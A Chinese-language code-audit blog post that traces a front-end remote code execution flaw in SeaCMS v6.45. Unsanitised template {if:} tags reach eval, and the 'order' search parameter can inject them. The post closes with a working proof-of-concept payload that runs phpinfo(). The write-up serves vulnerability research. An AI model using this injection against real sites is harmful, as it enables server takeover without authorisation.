---
title: seacms v6.5 前台getshell
date: 2017-03-16 15:47:15
tags: 
 - cms
categories: codereview
---

# 概述
前段时间放在[90sec](https://forum.90sec.org/forum.php?mod=viewthread&tid=10291)上的一篇代码审计，收拾一下放到自己博客上
<!-- more -->
# 分析
cms版本：6.45
直接上代码
```
function parseIf($content){
		if (strpos($content,'{if:')=== false){
		return $content;
		}else{
		$labelRule = buildregx("{if:(.*?)}(.*?){end if}","is");
		$labelRule2="{elseif";
		$labelRule3="{else}";
		preg_match_all($labelRule,$content,$iar);
		$arlen=count($iar[0]);
		$elseIfFlag=false;
		for($m=0;$m<$arlen;$m++){
			$strIf=$iar[1][$m];
			$strIf=$this->parseStrIf($strIf);
			$strThen=$iar[2][$m];
			$strThen=$this->parseSubIf($strThen);
			if (strpos($strThen,$labelRule2)===false){
				if (strpos($strThen,$labelRule3)>=0){
					$elsearray=explode($labelRule3,$strThen);
					$strThen1=$elsearray[0];
					$strElse1=$elsearray[1];
                    echo "if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}";
                    eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
					if ($ifFlag){ $content=str_replace($iar[0][$m],$strThen1,$content);} else {$content=str_replace($iar[0][$m],$strElse1,$content);}
				}else{
				@eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
				if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],"",$content);}
			}else{
				$elseIfArray=explode($labelRule2,$strThen);
				$elseIfArrayLen=count($elseIfArray);
				$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
				$resultStr=$elseIfSubArray[1];
				$elseIfArraystr0=addslashes($elseIfArray[0]);
				@eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}");
				for($elseIfLen=1;$elseIfLen<$elseIfArrayLen;$elseIfLen++){
					$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],":","}","");
					$strElseIf=$this->parseStrIf($strElseIf);
					$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],"}","","start"));
					@eval("if(".$strElseIf."){\$resultStr=\"$strElseIfThen\";}");
					@eval("if(".$strElseIf."){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
					if ($elseIfFlag) {break;}
				}
				$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],":","}","");
				$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],"}","","start"));
				if(strpos($strElseIf0,'==')===false&&strpos($strElseIf0,'=')>0)$strElseIf0=str_replace('=', '==', $strElseIf0);
				@eval("if(".$strElseIf0."){\$resultStr=\"$strElseIfThen0\";\$elseIfFlag=true;}");
				$content=str_replace($iar[0][$m],$resultStr,$content);
			}
		}
		return $content;
		}
	}
```
上面主要逻辑为解析html文件中的{if:}{end if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。
主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。
找到调用的位置line 212`$content=$mainClassObj->parseIf($content);`
往上看，发现他的逻辑是先解析其他类型的标签，比如`{searchpage:page}`
那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签
我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行
```
function echoSearchPage()
{
        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
        $order = !empty($order)?$order:time;
...
...
...
$content = str_replace("{searchpage:page}",$page,$content);
        $content = str_replace("{seacms:searchword}",$searchword,$content);
        $content = str_replace("{seacms:searchnum}",$TotalResult,$content);
        $content = str_replace("{searchpage:ordername}",$order,$content);
...
...
...
```
order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。
查看一下具体html代码
```
<div class="btn-toolbar" role="toolbar">
    <div class="btn-group">
      <a href="{searchpage:order-time-link}" {if:"{searchpage:ordername}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
      <a href="{searchpage:order-hit-link}" {if:"{searchpage:ordername}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
      <a href="{searchpage:order-score-link}" {if:"{searchpage:ordername}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
    </div>
  </div>
```
那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。
example：`}{end if}{if:1)phpinfo();if(1}{end if}`
本地验证一下
![](http://blog.0kami.cn/img/seacms/1.png)

# 总结
这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）
ps: 后悔啊，没有先提交个poc平台T_T


